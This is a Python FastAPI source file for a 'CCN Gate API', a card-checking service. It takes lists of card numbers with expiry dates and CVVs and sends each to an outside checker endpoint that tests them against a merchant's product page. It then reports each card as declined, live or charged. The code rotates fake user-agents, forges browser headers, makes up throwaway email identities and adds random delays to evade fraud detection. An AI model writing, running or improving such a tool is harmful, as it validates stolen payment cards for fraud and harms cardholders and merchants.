import os
import uuid
import string
import random
import asyncio
from typing import List, Optional

from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import httpx
from fake_useragent import UserAgent
import traceback

# ---------------------------
# FastAPI App
# ---------------------------
app = FastAPI(title="CCN Gate API", version="1.0.0")

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ---------------------------
# Models
# ---------------------------
class CCRequest(BaseModel):
    cards: str  # "cc|exp|cvv,cc|exp|cvv,..."

class CCResponse(BaseModel):
    card: str
    status: str
    message: str
    proxy_used: Optional[str] = None  # kept for compatibility; will be None now

# ---------------------------
# Helpers
# ---------------------------
def generate_nonce(length=10):
    chars = string.hexdigits.lower()
    return ''.join(random.choice(chars) for _ in range(length))

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

# you can replace users with any static UA or use fake_useragent below to rotate
DEFAULT_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

async def get_session():
    """
    Create an httpx AsyncClient WITHOUT proxying.
    Returns: httpx.AsyncClient
    """
    client = httpx.AsyncClient(
        timeout=httpx.Timeout(60.0),
        trust_env=False,
        follow_redirects=True,
    )
    return client

# ---------------------------
# Core Payment Function
# ---------------------------
async def create_payment_method(fullz: str, session: httpx.AsyncClient):
    """
    Always returns a CCResponse object (never None or raw string).
    Does not use proxies. Uses rotating user-agents via fake_useragent.
    """
    proxy_used = None
    try:
        cc, mes, ano, cvv = fullz.split("|")
        user = "cristniki" + str(random.randint(9999, 574545))
        mail = f"{user}@gmail.com"

        # rotate UA per request
        try:
            ua = UserAgent().random
        except Exception:
            ua = DEFAULT_UA

        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "user-agent": ua,
            # optional headers that make the request more browser-like
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not A(Brand)";v="99"',
            "sec-ch-ua-platform": '"Windows"',
            "referer": "https://google.com/",
        }

        # Example target — replace with your target if needed.
        url = (
            f'https://ayanochk.vip/api/ppcpgatewayccn.php'
            f'?lista={fullz}'
            f'&sites=https://mandarli.com/product/999-mogoke-mee-shay'
            f'&xlite=undefined'
        )

        # make request
        final = await session.get(url, headers=headers)

        response_text = final.text or ""

        # debug log of raw response (goes to stdout / render logs)
        print("🔹 API Raw Response (truncated 800 chars):")
        print(response_text[:800])

        # interpret response_text
        if "DECLINED" in response_text:
            status, message = "declined", "Card Declined"
        elif "CCN CHARGED" in response_text:
            status, message = "charged", "CCN $69 Charged"
        elif "LIVE CCN" in response_text:
            status, message = "live", "Invalid CVV → CCN"
        else:
            # include truncated response so you know what happened
            status, message = "error", f"Unexpected API Response: {response_text[:400]}"

        return CCResponse(
            card=fullz,
            status=status,
            message=message,
            proxy_used=proxy_used,
        )

    except Exception as e:
        error_details = traceback.format_exc()
        print("⚠️ Exception occurred while processing:", fullz)
        print(error_details)
        return CCResponse(
            card=fullz,
            status="error",
            message=error_details[:400],
            proxy_used=proxy_used,
        )

# ---------------------------
# API ENDPOINTS
# ---------------------------
@app.get("/")
async def root():
    return {"message": "CCN Gate API (no proxies) is running"}

@app.get("/ccngate/{cards}", response_model=List[CCResponse])
async def check_cards_get(cards: str):
    card_list = cards.split(",")[:5]

    results = []
    for i, card in enumerate(card_list):
        if not card.strip():
            continue

        session = await get_session()
        try:
            res = await create_payment_method(card.strip(), session)
            results.append(res)
        finally:
            await session.aclose()

        # small delay between cards
        await asyncio.sleep(random.uniform(1.5, 3.5))

    return results

@app.post("/ccngate", response_model=List[CCResponse])
async def check_cards_post(request: CCRequest):
    card_list = request.cards.split(",")[:5]

    results = []
    for i, card in enumerate(card_list):
        if not card.strip():
            continue

        session = await get_session()
        try:
            res = await create_payment_method(card.strip(), session)
            results.append(res)
        finally:
            await session.aclose()

        # small delay between cards
        await asyncio.sleep(random.uniform(1.5, 3.5))

    return results

# ---------------------------
# RUN
# ---------------------------
if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=int(os.environ.get("PORT", 8000)))
